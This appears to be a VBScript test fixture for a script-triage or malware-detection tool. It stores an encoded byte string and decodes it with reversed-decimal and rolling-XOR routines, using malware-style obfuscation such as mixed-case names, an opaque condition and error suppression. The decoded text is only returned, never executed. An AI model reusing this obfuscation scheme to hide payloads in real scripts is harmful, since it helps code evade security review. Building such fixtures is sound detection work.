Option Explicit
' Huntress Script Triage -- inert static-analysis fixture (wsh_vbscript_windows)
Const Material_c5605c4e = "84,54,1,98,84,55,4,54,7,40,76,45,66,46,94,43,4,96,9,101,4,114,28,117,91,62,82,34,79,46,86,51,29,44,73,47,78,42,75,126,27,122,25,54,25,35,80,32,84,32,72,117,25,107,30,65,37,68,43,71,55,66,62,74,43,79,97,80,53,83,50,86,55,2,103,6,101,72,45,74,43,95,44,112,18,115,63,76,63,90,40,92,50,71,15,83,48,89,53,87,34,114,46,93,47,74,57,108,48,10,73,116,28,104,9,121,38,67,47,70,32,92,109,8,110,15,107,10,63,90,59,88,119,21,116,56,75,56,93,47,91,53,64,8,53,65,47,74,45,76,19,97,4,119,2,126,10,107,15,33,16,32,24,47,75,45,28,47,0,100,13,97,0,118,24,113,95,58,86,38,75,42,82,55,25,40,77,43,74,46,79,122,31,126,29,50,29,39,84,36,80,36,76,113,29,111,26,102,87,50,84,53,81,48,5,96,1,98,79,33,70,47,78,62,83,50,81,108,8,97,62,80,55,94,63,79,34,67,32,92,110,83,39,73,60,83,48,111,10,109,12,120,11,119,71,105,95,113,33,117,33,105,37,104,48,66,39,81,35,70,21,59,9,69,8,80,3,78,115,1,100,16,96,1,101,4,120,29,105,6,107,14,124,35,71,38,73,37,85,32,12,126,27,125,14,96,1,115,7,88,61,79,46,94,59,73,57,21,121,24,123,20,120,39,66,54,87,52,91,55,10,121,9,108,24,107,23,38,27"
Const Codec_c5605c4e = "reversed_decimal|rolling_xor|6d"

Function Load_c5605c4e()
  Dim parts, result(), ByTeInDeX
  parts = Split(Material_c5605c4e, ",")
  ReDim result(UBound(parts))
  For ByTeInDeX = 0 To UBound(parts)
    result(UBound(parts) - ByTeInDeX) = CInt(parts(ByTeInDeX))
  Next
  Load_c5605c4e = result
End Function

Function Decode_c5605c4e(ByRef SoUrCeByTeS)
  Dim result(), ByTeInDeX, keyBytes, previous
  ReDim result(UBound(SoUrCeByTeS))
  previous = 109
  For ByTeInDeX = 0 To UBound(SoUrCeByTeS)
    result(ByTeInDeX) = SoUrCeByTeS(ByTeInDeX) Xor previous
    previous = SoUrCeByTeS(ByTeInDeX)
  Next
  Decode_c5605c4e = result
End Function

Function Recover_c5605c4e()
  Dim SoUrCeByTeS, DeCoDeDByTeS, DeScRiPtOrTeXt, NeUtRaL, ByTeInDeX, PaSs, ErRoRnUmBeR, ErRoRdEsCrIpTiOn
  If (2 > 1) Then NeUtRaL = "left" Else NeUtRaL = "right"
  SoUrCeByTeS = Load_c5605c4e()
  On Error Resume Next
  DeCoDeDByTeS = Decode_c5605c4e(SoUrCeByTeS)
  ErRoRnUmBeR = Err.Number
  ErRoRdEsCrIpTiOn = Err.Description
  On Error GoTo 0
  If ErRoRnUmBeR <> 0 Then Err.Raise ErRoRnUmBeR, "HuntressFixture", ErRoRdEsCrIpTiOn
  DeScRiPtOrTeXt = ""
  For ByTeInDeX = 0 To UBound(DeCoDeDByTeS)
    DeScRiPtOrTeXt = DeScRiPtOrTeXt & Chr(DeCoDeDByTeS(ByTeInDeX))
  Next
  Recover_c5605c4e = DeScRiPtOrTeXt
End Function

Function Inspect_c5605c4e()
  Inspect_c5605c4e = Recover_c5605c4e()
End Function
